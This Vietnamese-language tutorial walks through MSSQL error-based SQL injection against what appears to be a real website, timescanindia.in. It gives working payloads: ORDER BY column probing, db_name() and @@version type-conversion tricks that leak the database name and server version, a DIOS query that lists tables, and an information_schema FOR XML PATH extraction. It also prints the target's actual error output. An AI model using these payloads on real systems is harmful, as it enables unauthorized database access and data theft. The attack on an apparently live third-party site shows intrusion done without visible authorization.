### Người thực hiện: Trần Ngọc Nam
### Thời gian: 21/04/2022

## MSSQL Error Based Injection:
- Ta thường sử dụng error based injection khi không thể khai thác thông qua câu lệnh union.
- Đầu tiên, ta cần biết các cách comment cho MSSQL.

    | No. | Comment | Name                |
    | --- | ------- | ------------------- |
    | 1.  | --      | Kiểu Chú thích 1    |
    | 2.  | --+     | Kiểu Chú thích 2    |
    | 3.  | --+-    | Chú thích SQL       |
    | 4.  | /**/    | Chú thích nội tuyến |
    | 5.  | ;%00    | Null Byte           |
- Bây giờ ta thử comment --
  ```php
    http://www.timescanindia.in/Product.aspx?Id=7--
    working fine.
    http://www.timescanindia.in/Product.aspx?Id=7 order by 1--
    No Error
    http://www.timescanindia.in/Product.aspx?Id=7 order by 100--
    Here comes the error : The ORDER BY position number 100 is out of range of the number of items in the select list
  ```
- Bây giờ ta sẽ thử tiêm lỗi error based injection.
  ```php
  http://www.timescanindia.in/Product.aspx?Id=7 and 1=db_name()--
  Boom we got the error, and yeah the output also contains database name alongwith it.
  Conversion failed when converting the nvarchar value 'timescanindia' to data type int
  ```
- Ta dễ dàng có được tên database là <code>timescanindia</code>
- Ta cũng có thể dễ dàng tìm được version của database thông qua
  ```php
  http://www.timescanindia.in/Product.aspx?Id=7 and @@version=1--
  Again we got an error as well as the output with the error: 
  Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2012 (SP1) - 11.0.3000.0 (X64)
  Oct 19 2012 13:38:57
  Copyright (c) Microsoft Corporation
  Web Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)' to data type int..
  ```
- Như vậy, ta đã có thông tin về version thông qua lỗi trả về.
- Nếu bạn muốn xem tiếp các table trong database, ta có 3 cách:
  - Sử dụng MSSQL DIOS (có dạng như):
    ```php
    BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy ' ' name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;
    ```
  - Kết quả trả về sẽ có dạng:
    ```php
    table1:column1
    table1:column2
    table1:column3
    table2:column1
    table2:column2
    table2:column3
    table3:column1
    and so on..
    ```
  - Hoặc ta có thể dùng truy vấn
    ```php
    http://www.timescanindia.in/Product.aspx?Id=7 and (select output from err_dios)=1
    Again we got an error as well as the output with the error: 
    ```
  - Hoặc ta có thể dùng
    ```php
    http://www.timescanindia.in/Product.aspx?Id=7 and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--
    ```
- Như vậy, ta đã hoàn thành cơ bản lỗi MSSQL Error Based Injection.